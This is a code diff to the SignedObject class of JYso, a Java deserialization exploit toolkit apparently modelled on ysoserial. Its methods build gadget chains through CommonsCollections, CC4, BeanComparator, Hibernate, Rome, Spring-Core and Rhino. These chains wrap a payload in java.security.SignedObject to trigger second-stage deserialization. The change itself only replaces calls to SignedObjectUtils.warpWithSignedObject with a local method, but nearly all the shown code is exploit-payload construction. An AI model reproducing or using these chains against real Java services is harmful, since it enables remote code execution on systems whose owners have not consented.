@@ -2,7 +2,6 @@ package com.qi4l.JYso.gadgets;
 
 import cn.hutool.core.comparator.PropertyComparator;
 import com.qi4l.JYso.gadgets.utils.Reflections;
-import com.qi4l.JYso.gadgets.utils.SignedObjectUtils;
 import com.qi4l.JYso.gadgets.utils.dirty.DirtyDataWrapper;
 import com.sun.syndication.feed.impl.ObjectBean;
 import org.apache.commons.beanutils.BeanComparator;
@@ -147,7 +146,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // CC 无数组二次反序列化
     public Object getSignedObjectWithCCNoArray(Object serObj) throws Exception {
-        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = warpWithSignedObject((Serializable) serObj);
 
         Map<?,?> old = new HashMap<>();
         Transformer invoke = new InvokerTransformer("toString", null, null);
@@ -163,7 +162,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // CC4 无 TiedMapEntry 二次反序列化
     public Object getSignedObjectWithCC4(Object serObj) throws Exception {
-        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = warpWithSignedObject((Serializable) serObj);
 
         org.apache.commons.collections4.functors.InvokerTransformer transformer = new org.apache.commons.collections4.functors.InvokerTransformer<>("toString", new Class[0], new Object[0]);
         TransformingComparator comp = new TransformingComparator<>(transformer);
@@ -175,7 +174,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // CB 二次反序列化
     public Object getSignedObjectWithCB(Object serObj) throws Exception {
-        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = warpWithSignedObject((Serializable) serObj);
 
         final BeanComparator<?> comparator = new BeanComparator<>("lowestSetBit");
         final PriorityQueue<Object> queue = new PriorityQueue<>(2, (Comparator<? super Object>) comparator);
@@ -189,7 +188,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // Hibernate 二次反序列化
     public Object getSignedObjectWithHibernate(Object serObj) throws Exception {
-        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = warpWithSignedObject((Serializable) serObj);
         Object getters = Hibernate1.makeGetter(obj.getClass(), "getObject");
         return Hibernate1.makeCaller(obj, getters);
     }
@@ -197,7 +196,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // Rome 二次反序列化
     public Object getSignedObjectWithRome(Object serObj) throws Exception {
-        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = warpWithSignedObject((Serializable) serObj);
         ObjectBean delegate = new ObjectBean(java.security.SignedObject.class, obj);
         ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
         return makeMap(root, root);
@@ -206,7 +205,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // Spring-Core 二次反序列化
     public Object getSignedObjectWithSpring(Object serObj) throws Exception {
-        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = warpWithSignedObject((Serializable) serObj);
         ObjectFactory<?> objectFactoryProxy = createMemoitizedProxy(createMap("getObject", obj), ObjectFactory.class);
         Type typeTemplatesProxy = createProxy((InvocationHandler) Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, java.security.SignedObject.class);
         Object typeProviderProxy = createMemoitizedProxy(createMap("getType", typeTemplatesProxy), forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
@@ -219,7 +218,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // Rhino 二次反序列化
     public Object getSignedObjectWithRhino(Object serObj) throws Exception {
-        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = warpWithSignedObject((Serializable) serObj);
         ScriptableObject dummyScope = new Environment();
         Map<Object, Object> associatedValues = new Hashtable<>();
         associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
